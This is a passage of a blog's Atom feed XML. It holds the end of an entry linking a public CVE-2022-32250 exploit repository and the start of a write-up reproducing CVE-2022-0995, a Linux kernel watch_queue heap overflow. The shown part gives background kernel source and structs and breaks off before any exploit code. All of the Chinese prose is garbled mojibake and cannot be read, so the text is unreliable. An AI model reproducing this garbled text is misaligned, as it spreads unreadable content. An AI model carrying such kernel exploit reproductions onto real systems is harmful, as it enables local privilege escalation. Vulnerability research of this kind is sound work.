>https://github.com/theori-io/CVE-2022-32250-exploit<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h2&gt;&lt;p&gt;å› ä¸ºå·¥ä½œç›®å‰é¢å¯¹ç€ä¸€ä¸ªä¸æ€ä¹ˆç†Ÿæ‚‰çš„&lt;code&gt;netfilter&lt;/code&gt;è¿™ä¸€æ¨¡å—ï¼Œæ‰€ä»¥ç›´æ¥å¤ç°ä¸€ä¸ªä»¥å¾€çš„CVEæ¥è®¤è¯†è®¤è¯†è¿™ä¸ªæ¨¡å—ã€‚&lt;/</summary>
      
    
    
    
    <category term="Linux Kernel" scheme="https://196082.github.io/categories/Linux-Kernel/"/>
    
    <category term="CVEå¤ç°" scheme="https://196082.github.io/categories/Linux-Kernel/CVE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="netfilter" scheme="https://196082.github.io/tags/netfilter/"/>
    
    <category term="io_uring" scheme="https://196082.github.io/tags/io-uring/"/>
    
    <category term="user_key_payload" scheme="https://196082.github.io/tags/user-key-payload/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2022-0995å¤ç°</title>
    <link href="https://196082.github.io/2023/08/21/CVE-2022-0995/"/>
    <id>https://196082.github.io/2023/08/21/CVE-2022-0995/</id>
    <published>2023-08-21T06:27:52.000Z</published>
    <updated>2023-11-29T10:11:26.118Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å…¶å®å‰ä¸¤å¤©å¤ç°äº†ä¸€ä¸ª2023çš„CVEï¼Œæœ¬æ¥æ‰“ç®—å†™é‚£ä¸€ä¸ªçš„ï¼Œä½†æ˜¯å¯¹äºé‚£ä¸ªCVEæ›´å¤šçš„æ˜¯åšå·¥ä½œä¸Šçš„é€‚é…ï¼Œåœ¨ä¸€äº›å°ç»†èŠ‚ä¸Šçš„åŸç†å¹¶æ²¡æœ‰æŒæ¡å¾—ç‰¹åˆ«é€å½»ï¼Œå¹¶ä¸”å› ä¸ºæ˜¯åˆšåˆšå…¬å¼€çš„ä¸€ä¸ªCVEä¹Ÿå¯¼è‡´æ²¡æœ‰æ›´å¤šçš„æ–‡ç« è¿›è¡Œå‚è€ƒï¼Œç­‰åé¢è¿›ä¸€æ­¥åˆ†æä¸€ä¸‹æºç å†å†™ã€‚</p><p>æ­¤æ¬¡çš„CVEæ˜¯å­˜åœ¨äºè§‚å¯Ÿé˜Ÿåˆ—äº‹ä»¶é€šçŸ¥å­ç³»ç»Ÿ (watch_queue event notification subsystem) ä¸­çš„ä¸€ä¸ªå †æº¢å‡ºæ¼æ´ï¼Œè¯¥æ¼æ´ä»å†…æ ¸ç‰ˆæœ¬5.8ä¼´éšç€ watch queue subsystem å¼•å…¥ï¼Œåœ¨ 5.17-rc4 å¾—åˆ°ä¿®å¤ã€‚</p><h2 id="åŸºç¡€çŸ¥è¯†"><a href="#åŸºç¡€çŸ¥è¯†" class="headerlink" title="åŸºç¡€çŸ¥è¯†"></a>åŸºç¡€çŸ¥è¯†</h2><p>é€šç”¨é€šçŸ¥æœºåˆ¶æ˜¯å»ºç«‹åœ¨æ ‡å‡†ç®¡é“é©±åŠ¨ä¹‹ä¸Šçš„ï¼Œå…¶å¯ä»¥æœ‰æ•ˆåœ°å°†æ¥è‡ªå†…æ ¸çš„é€šçŸ¥æ¶ˆæ¯æ‹¼æ¥åˆ°ç”¨æˆ·æ‰“å¼€çš„ç®¡é“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>CONFIG_WATCH_QUEUE</code> ç¼–è¯‘é€‰é¡¹å¯ç”¨ï¼ˆé»˜è®¤å¼€å¯ï¼‰</p><p>è¯¥æœºåˆ¶é€šè¿‡ä¸€ä¸ªä»¥ç‰¹æ®Šæ¨¡å¼æ‰“å¼€çš„ç®¡é“å®ç°ï¼Œå†…æ ¸ç”Ÿæˆçš„æ¶ˆæ¯è¢«ä¿å­˜åˆ°ç®¡é“å†…éƒ¨çš„å¾ªç¯ç¯å½¢ç¼“å†²åŒºä¸­ï¼ˆ<code>pipe_buffer</code> é˜Ÿåˆ—ï¼‰ï¼Œé€šè¿‡ <code>read()</code> è¿›è¡Œè¯»å–ï¼Œç”±äºåœ¨æŸäº›æƒ…å†µä¸‹æˆ‘ä»¬å¯èƒ½æƒ³è¦å°†æ·»åŠ çš„å†…å®¹è¿˜åŸåˆ°ç¯ä¸Šï¼Œå› æ­¤åœ¨æ­¤ç±»ç®¡é“ä¸Šç¦ç”¨äº† splice ä»¥åŠç±»ä¼¼åŠŸèƒ½ï¼ˆå› ä¸ºè¿™å¯èƒ½å¯¼è‡´å…¶ä¸é€šçŸ¥æ¶ˆæ¯äº¤ç»‡åœ¨ä¸€èµ·ï¼‰</p><p>ç®¡é“çš„æ‰€æœ‰è€…åº”å½“å‘Šè¯‰å†…æ ¸å“ªäº›èµ„æºå…¶æƒ³è¦é€šè¿‡è¯¥ç®¡é“è¿›è¡Œè§‚å¯Ÿï¼Œåªæœ‰è¿æ¥åˆ°è¯¥ç®¡é“ä¸Šçš„èµ„æºæ‰ä¼šå¾€é‡Œè¾¹æ’å…¥æ¶ˆæ¯ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€ä¸ªèµ„æºå¯èƒ½ä¼šä¸å¤šä¸ªç®¡é“ç»‘å®šå¹¶åŒæ—¶å°†æ¶ˆæ¯æ’å…¥æ‰€æœ‰ç®¡é“</p><p>è‹¥ç¯ä¸­æ²¡æœ‰å¯ç”¨çš„æ’æ§½æˆ–å¯ç”¨çš„é¢„åˆ†é…çš„ message bufferï¼ˆä¸€ä¸ªç®¡é“é»˜è®¤åªæœ‰ 16 ä¸ª <code>pipe_buffer</code> â€”â€”å¯¹åº” 16 å¼ å†…å­˜é¡µï¼‰ï¼Œåˆ™æ¶ˆæ¯å°†ä¼šè¢«ä¸¢å¼ƒï¼Œåœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œ<code>read()</code> å°†åœ¨è¯»å–å½“å‰ç¼“å†²åŒºçš„æœ€åä¸€æ¡æ¶ˆæ¯åå°† <code>WATCH_META_LOSS_NOTIFICATION</code> æ’å…¥è¾“å‡ºç¼“å†²åŒºã€‚</p><h3 id="Watch-Queue-API"><a href="#Watch-Queue-API" class="headerlink" title="Watch Queue API"></a>Watch Queue API</h3><p>ä¸€ä¸ªè§‚æµ‹é˜Ÿåˆ—ï¼ˆwatch queueï¼‰æ˜¯ç”±ä¸€ä¸ªåº”ç”¨åˆ†é…çš„ç”¨ä»¥è®°å½•é€šçŸ¥çš„ç¼“å†²åŒºï¼Œå…¶å·¥ä½œåŸç†å®Œå…¨éšè—åœ¨ç®¡é“è®¾å¤‡é©±åŠ¨ä¸­ï¼Œä½†æœ‰å¿…è¦è·å¾—ä¸€ä¸ªå¯¹å…¶çš„å¼•ç”¨ä»¥è®¾ç½®ä¸€ä¸ªè§‚æµ‹ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹ API è¿›è¡Œç®¡ç†ï¼š</p><ul><li><p><code>struct watch_queue *get_watch_queue(int fd);</code></p><p>  ç”±äºè§‚æµ‹é˜Ÿåˆ—åœ¨å†…æ ¸ä¸­é€šè¿‡å®ç°ç¼“å†²åŒºçš„ç®¡é“çš„æ–‡ä»¶æè¿°ç¬¦è¡¨ç¤ºï¼Œç”¨æˆ·ç©ºé—´å¿…é¡»é€šè¿‡ç³»ç»Ÿè°ƒç”¨ä¼ é€’è¯¥æ–‡ä»¶æè¿°ç¬¦ï¼Œè¿™å¯ä»¥ç”¨äºä»ç³»ç»Ÿè°ƒç”¨ä¸­æŸ¥æ‰¾æŒ‡å‘è§‚æµ‹é˜Ÿåˆ—çš„ä¸é€æ˜æŒ‡é’ˆ</p></li><li><p><code>void put_watch_queue(struct watch_queue *wqueue);</code></p><p>  è¯¥å‡½æ•°ç”¨ä»¥ä¸¢å¼ƒä» <code>get_watch_queue()</code> è·å¾—çš„å¼•ç”¨</p></li></ul><h3 id="Event-Filter"><a href="#Event-Filter" class="headerlink" title="Event Filter"></a>Event Filter</h3><p>å½“ä¸€ä¸ªè§‚æµ‹é˜Ÿåˆ—è¢«åˆ›å»ºåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿‡æ»¤å™¨é™åˆ¶æ¥æ”¶çš„äº‹ä»¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> &#123;</span></span><br><span class="line">__u32nr_filters;<span class="comment">/* Number of filters */</span></span><br><span class="line">__u32__reserved;<span class="comment">/* Must be 0 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> <span class="title">filters</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_filter</span> <span class="title">filter</span> =</span> &#123;</span><br><span class="line">        ...</span><br><span class="line">&#125;;</span><br><span class="line">ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, &amp;filter)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¸»è¦è§£é‡Šä¸€ä¸‹ç»“æ„ä½“ä¸­çš„æˆå‘˜çš„å«ä¹‰ï¼Œ<code>nr_filters</code>æˆå‘˜è¡¨ç¤ºçš„æ˜¯<code>filters[]</code>æ•°ç»„ä¸­è¿‡æ»¤å™¨çš„æ•°é‡ï¼Œè€Œå¯ä»¥çœ‹å‡ºæ¥<code>__reserved</code>æ˜¯å¿…é¡»ç½®0çš„ã€‚éœ€è¦æ³¨æ„çš„æ˜¯å…¶ä¸­<code>filters[]</code>æ•°ç»„çš„ç±»å‹ä¸º<code>watch_notification_type_filter</code>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">watch_notification_type_filter</span> &#123;</span></span><br><span class="line">__u32type;<span class="comment">/* Type to apply filter to */</span></span><br><span class="line">__u32info_filter;<span class="comment">/* Filter on watch_notification::info */</span></span><br><span class="line">__u32info_mask;<span class="comment">/* Mask of relevant bits in info_filter */</span></span><br><span class="line">__u32subtype_filter[<span class="number">8</span>];<span class="comment">/* Bitmask of subtypes to filter on */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿæ˜¯ç®€å•ä»‹ç»ä¸€ä¸‹å…¶ä¸­çš„ç»“æ„ä½“çš„å«ä¹‰ï¼Œé¦–å…ˆæ˜¯<code>type</code>ä»£è¡¨çš„æ˜¯éœ€è¦è¿‡æ»¤äº‹ä»¶çš„ç±»å‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">watch_notification_type</span> &#123;</span></span><br><span class="line">WATCH_TYPE_META= <span class="number">0</span>,<span class="comment">/* Special record */</span></span><br><span class="line">WATCH_TYPE_KEY_NOTIFY= <span class="number">1</span>,<span class="comment">/* Key change event notification */</span></span><br><span class="line">WATCH_TYPE__NR= <span class="number">2</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>info_filter</code>æˆå‘˜ä¸<code>info_mask</code>æˆå‘˜å……å½“çš„æ˜¯é€šçŸ¥è®°å½•çš„ä¿¡æ¯å­—æ®µçš„è¿‡æ»¤å™¨ï¼Œä»…å½“å¦‚ä¸‹æƒ…å†µæ‰ä¼šå°†é€šçŸ¥å†™å…¥ç¼“å†²åŒºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(watch.info &amp; info_mask) == info_filter</span><br></pre></td></tr></table></figure><p><code>subtype_filter</code>æˆå‘˜åˆ™æ˜¯æŒ‡ç¤ºæˆ‘ä»¬æ„Ÿå…´è¶£çš„å­—ç±»å‹çš„<code>bitmask</code>ï¼Œ<code>subtype_filter[0]</code>çš„0ä½å¯¹åº”å­ç±»å‹0ï¼Œ1ä½å¯¹åº”å­ç±»å‹1â€¦</p><p>è‹¥æ˜¯ä¸Šé¢ä½¿ç”¨<code>ioctl(fd, IOC_WATCH_QUEUE_SET_FILTER, NULL)</code>åˆ™ä¸ºç§»å‡ºè¿‡æ»¤å™¨ï¼Œæ­¤æ—¶æ¥å—æ‰€æœ‰æ¥è‡ªè§‚æµ‹çš„ä¿¡æ¯ã€‚</p><h3 id="watch-queue-subsystem-ä¸­-Event-Filter-å®ç°"><a href="#watch-queue-subsystem-ä¸­-Event-Filter-å®ç°" class="headerlink" title="watch queue subsystem ä¸­ Event Filter å®ç°"></a>watch queue subsystem ä¸­ Event Filter å®ç°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE3(ioctl, <span class="keyword">unsigned</span> <span class="keyword">int</span>, fd, <span class="keyword">unsigned</span> <span class="keyword">int</span>, cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd);</span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!f.file)</span><br><span class="line"><span class="keyword">return</span> -EBADF;</span><br><span class="line"></span><br><span class="line">error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = do_vfs_ioctl(f.file, fd, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = vfs_ioctl(f.file, cmd, arg);</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">fdput(f);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆåˆ™æ˜¯æˆ‘ä»¬è°ƒç”¨<code>ioctl</code>æ˜¯ä¼šè¿›å…¥å¦‚ä¸Šå‡½æ•°ï¼Œå¹¶ä¸”é€šè¿‡éªŒè¯ä¹‹åæœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>do_vfs_ioctl</code>å‡½æ•°ï¼Œè€Œè¿™ä¸ªå‡½æ•°å†…éƒ¨å°±æ˜¯ä¸€ä¸ªç¡•å¤§<code>switch</code>è¯­å¥æ ¹æ®cmdè¿›è¡Œå¤„ç†ï¼Œä½†æ˜¯<code>IOC_WATCH_QUEUE_SET_FILTER</code>å¹¶ä¸åœ¨å…¶ä¸­ï¼Œæ‰€ä»¥æœ€ç»ˆä¼šè°ƒç”¨åˆ°<code>vfs_ioctl</code>å‡½æ•°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">vfs_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line"><span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line"><span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(vfs_ioctl);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æ³¨æ„åˆ°çš„äº‹è¿™é‡Œå…¶å®è°ƒç”¨çš„æ˜¯<code>filp-&gt;f_op-&gt;unlocked_ioctl</code>å‡½æ•°ï¼Œæ‰€ä»¥é¦–è¦å°±æ˜¯è¦ææ˜ç™½è¿™æ˜¯ä¸ªä»€ä¹ˆå‡½æ•°ã€‚</p><p>å‰æ–‡æåˆ°ï¼Œé€šçŸ¥æœºåˆ¶æ˜¯å»ºç«‹åœ¨ç®¡é“ä¸Šé¢çš„ï¼Œæ‰€ä»¥è¿™é‡Œæ–‡ä»¶æè¿°ç¬¦å…¶å®ä¹Ÿå°±æ˜¯ç®¡é“çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å½“å‰åˆ™éœ€è¦æ›´å¤šçš„å°†ç›®å…‰æ”¾åœ¨ç®¡é“çš„åˆ›å»ºä¸Šé¢ï¼Œè€Œç®¡é“çš„åˆ›å»ºå­˜åœ¨ä»¥ä¸‹è°ƒç”¨å…³ç³»ï¼š<code>do_pipe2() =&gt; __do_pipe_flags() =&gt; create_pipe_files() =&gt; alloc_file_pseudo() =&gt; alloc_file()</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct file *<span class="title">alloc_file</span><span class="params">(<span class="keyword">const</span> struct path *path, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function"><span class="keyword">const</span> struct file_operations *fop)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"></span><br><span class="line">file = alloc_empty_file(flags, current_cred());</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line"></span><br><span class="line">file-&gt;f_path = *path;</span><br><span class="line">file-&gt;f_inode = path-&gt;dentry-&gt;d_inode;</span><br><span class="line">file-&gt;f_mapping = path-&gt;dentry-&gt;d_inode-&gt;i_mapping;</span><br><span class="line">file-&gt;f_wb_err = filemap_sample_wb_err(file-&gt;f_mapping);</span><br><span class="line">file-&gt;f_sb_err = file_sample_sb_err(file);</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_READ) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;read || fop-&gt;read_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_READ;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; FMODE_WRITE) &amp;&amp;</span><br><span class="line">     likely(fop-&gt;write || fop-&gt;write_iter))</span><br><span class="line">file-&gt;f_mode |= FMODE_CAN_WRITE;</span><br><span class="line">file-&gt;f_mode |= FMODE_OPENED;</span><br><span class="line">file-&gt;f_op = fop;</span><br><span class="line"><span class="keyword">if</span> ((file-&gt;f_mode &amp; (FMODE_READ | FMODE_WRITE)) == FMODE_READ)</span><br><span class="line">i_readcount_inc(path-&gt;dentry-&gt;d_inode);</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°çš„æ˜¯è¿™é‡Œå¯¹äºopsçš„èµ‹å€¼æ˜¯å‘ç”Ÿåœ¨è¿™ä¸ªä½ç½®çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">create_pipe_files</span><span class="params">(struct file **res, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> get_pipe_inode();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">f</span>;</span></span><br><span class="line"><span class="keyword">int</span> error;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!inode)</span><br><span class="line"><span class="keyword">return</span> -ENFILE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (flags &amp; O_NOTIFICATION_PIPE) &#123;</span><br><span class="line">error = watch_queue_init(inode-&gt;i_pipe);</span><br><span class="line"><span class="keyword">if</span> (error) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f = alloc_file_pseudo(inode, pipe_mnt, <span class="string">&quot;&quot;</span>,</span><br><span class="line">O_WRONLY | (flags &amp; (O_NONBLOCK | O_DIRECT)),</span><br><span class="line">&amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(f)) &#123;</span><br><span class="line">free_pipe_info(inode-&gt;i_pipe);</span><br><span class="line">iput(inode);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(f);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line"></span><br><span class="line">res[<span class="number">0</span>] = alloc_file_clone(f, O_RDONLY | (flags &amp; O_NONBLOCK),</span><br><span class="line">  &amp;pipefifo_fops);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(res[<span class="number">0</span>])) &#123;</span><br><span class="line">put_pipe_info(inode, inode-&gt;i_pipe);</span><br><span class="line">fput(f);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(res[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line">res[<span class="number">0</span>]-&gt;private_data = inode-&gt;i_pipe;</span><br><span class="line">res[<span class="number">1</span>] = f;</span><br><span class="line">stream_open(inode, res[<span class="number">0</span>]);</span><br><span class="line">stream_open(inode, res[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶è€ŒçœŸæ­£ä¼ å…¥opsçš„æ˜¯è¿™ä¸ªå‡½æ•°å†…éƒ¨ä¸­ï¼Œå¯ä»¥çœ‹åˆ°opså…¶å®å°±æ˜¯<code>pipefifo_fops</code>å˜é‡ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">pipefifo_fops</span> =</span> &#123;</span><br><span class="line">.open= fifo_open,</span><br><span class="line">.llseek= no_llseek,</span><br><span class="line">.read_iter= pipe_read,</span><br><span class="line">.write_iter= pipe_write,</span><br><span class="line">.poll= pipe_poll,</span><br><span class="line">.unlocked_ioctl= pipe_ioctl,</span><br><span class="line">.release= pipe_release,</span><br><span class="line">.fasync= pipe_fasync,</span><br><span class="line">.splice_write= iter_file_splice_write,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>unlocked_ioctl</code>å¯¹åº”çš„ä¹Ÿå°±æ˜¯<code>pipe_ioctlå‡½æ•°</code>ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">pipe_ioctl</span><span class="params">(struct file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span> *<span class="title">pipe</span> =</span> filp-&gt;private_data;</span><br><span class="line"><span class="keyword">int</span> count, head, tail, mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line"><span class="keyword">case</span> FIONREAD:</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">count = <span class="number">0</span>;</span><br><span class="line">head = pipe-&gt;head;</span><br><span class="line">tail = pipe-&gt;tail;</span><br><span class="line">mask = pipe-&gt;ring_size - <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (tail != head) &#123;</span><br><span class="line">count += pipe-&gt;bufs[tail &amp; mask].len;</span><br><span class="line">tail++;</span><br><span class="line">&#125;</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> put_user(count, (<span class="keyword">int</span> __user *)arg);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WATCH_QUEUE</span></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_SIZE: &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">__pipe_lock(pipe);</span><br><span class="line">ret = watch_queue_set_size(pipe, arg);</span><br><span class="line">__pipe_unlock(pipe);</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> IOC_WATCH_QUEUE_SET_FILTER:</span><br><span class="line"><span class="keyword">return</span> watch_queue_set_filter(</span><br><span class="line">pipe, (struct watch_notification_filter __user *)arg);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -ENOIOCTLCMD;</span><br><span class="line">&#125;</span><br><span 